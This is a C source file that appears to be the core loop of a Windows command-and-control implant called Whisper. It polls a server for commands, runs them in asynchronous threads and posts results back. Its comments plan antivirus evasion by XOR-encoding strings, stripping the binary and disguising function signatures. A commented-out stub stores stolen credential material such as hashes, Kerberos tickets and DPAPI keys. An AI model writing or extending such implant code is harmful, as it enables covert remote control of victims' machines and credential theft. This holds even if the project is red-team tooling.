// core, simple with basic control flow.
#include "comms_http.h"
#include "type_conversions.h"
#include "whisper_commands.h"
#include "whisper_config.h"
#include "whisper_json.h"
#include "whisper_winapi.h"
#include "whisper_dynamic_config.h"
#include "whisper_credmanager.h"
#include <time.h>
#include <stdint.h>
#include <stdio.h>
#include <windows.h> // < might be hodling some defs that we need to dynamically call... deal with later
// #include <unistd.h>  // For sleep(), use windows.h for sleep, or a custom one
/*
RE Notes:
 - Going to need to XOR strings
 - Strip Binary as well
 - Note, the Whisper functions might match signatures of known windows funcs -
so that could be a detection. maybe add a BS argument to each one to bypass
this? either at front or back.

*/

// int execute();
DWORD execute_async(char * agent_id);
void generate_uuid4(char* agent_id);

// ASYNC BEACON!!!
/*
Just starts a thread and lets it run each time, incase it fails or is long
running, it'll send a message back when it's done/ready.

test with this:

shell powershell -c "Start-Sleep -Seconds 120; whoami"

shell echo "TEST"

The echo test will come back first, then the powershell command will do it's
thing, and show up when done.

This is reflected in the command API call, and in the web gui.


*/

int main()
{
    DEBUG_LOG("STARTING");

    char agent_id[37];
    generate_uuid4(agent_id);


    while (1) {

        // Create thread
        HANDLE thread = WhisperCreateThread(NULL, 0, execute_async, agent_id, 0, NULL);
        if (thread) {
            CloseHandle(thread); // Let the thread clean itself up
        } else {
            DEBUG_LOG("Failed to create thread.\n");

        }
        // Sleep for X seconds before running the next loop, gets time from get_sleep_time()
        WhisperSleep(get_sleep_time());
    }
}

// Thread function for executing the command asynchronously
DWORD WINAPI execute_async(char * agent_id)
{

    //bug somewhere in here. yay
    // add_credential("admin", "CORP", 
    //             "31d6cfe0d16ae931b73c59d7e0c089c0", NULL, "P@ssw0rd!",
    //             "base64-KerbTGT", "aes128-key", "aes256-key",
    //             "dpapi-master-key");

    
    // display_credentials();

    //this fills in the command, arg and command_id
    InboundJsonDataStruct InboundJsonData = get_command_data(agent_id);
    //this populates the new structure with the agent_uuid
    InboundJsonData.agent_id = agent_id;

    if (!InboundJsonData.command) {
        DEBUG_LOG("Could not get command");
        return;
    }

    DEBUG_LOG("Decoded Command: %s\n", InboundJsonData.command);

    //go ahead and setup our struct for outbound comms
    //using calloc for init on the values here
    OutboundJsonDataStruct* OutboundJsonData = (OutboundJsonDataStruct*)calloc(1, sizeof(OutboundJsonDataStruct));
    if (!OutboundJsonData) {
        DEBUG_LOG("Memory allocation failed for OutboundJsonData.\n");
        return 1;
    }

    // Assign UUID
    OutboundJsonData->agent_id = strdup(agent_id); // Allocates memory and copies the string. Previous strncpy_s only copied, not allocated. Need to free
    OutboundJsonData->command_result_data = NULL;

    // Parse command and modify OutboundJsonData
    parse_command(InboundJsonData.command, InboundJsonData.args, OutboundJsonData);

    DEBUG_LOG("UUID: %s\n", OutboundJsonData->agent_id);
    DEBUG_LOG("COMMAND_ID: %s\n", InboundJsonData.command_id);
    DEBUG_LOG("command_result_data: %s\n", OutboundJsonData->command_result_data ? OutboundJsonData->command_result_data : "NULL");

    // Convert to JSON and send
    char* encoded_json_response = encode_json(OutboundJsonData->agent_id, OutboundJsonData->command_result_data, InboundJsonData.command_id);
    post_data(encoded_json_response, agent_id);

    // free allocated memory
    //need to double check this

    free(InboundJsonData.command);    // Allocated in decode_command_json
    free(InboundJsonData.command_id); // Allocated in decode_command_json
    free(InboundJsonData.args);       // Allocated in decode_command_json (if applicable)

    //Outbound freeing. Only need to free if using a func that allocates memory to a strucutre member
    free(OutboundJsonData->agent_id); //freed due to 'OutboundJsonData->agent_id = strdup(agent_id);' line.
    free(OutboundJsonData); // freeing the strucutre itself: 'OutboundJsonDataStruct* OutboundJsonData = (OutboundJsonDataStruct*)calloc(1, sizeof(OutboundJsonDataStruct));'


    return 0;
}

void generate_uuid4(char* uuid) {
    uint8_t bytes[16];

    // Seed the random number generator
    srand((unsigned int)time(NULL));

    // Generate 16 random bytes
    for (int i = 0; i < 16; i++) {
        bytes[i] = rand() % 256;
    }

    // Set the version to 4 --> 0100
    bytes[6] = (bytes[6] & 0x0F) | 0x40;

    // Set the variant to 10xxxxxx
    bytes[8] = (bytes[8] & 0x3F) | 0x80;

    // Format UUID as a string
    sprintf_s(uuid, 37,
        "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
        bytes[0], bytes[1], bytes[2], bytes[3],
        bytes[4], bytes[5],
        bytes[6], bytes[7],
        bytes[8], bytes[9],
        bytes[10], bytes[11], bytes[12], bytes[13], bytes[14], bytes[15]
    );
}
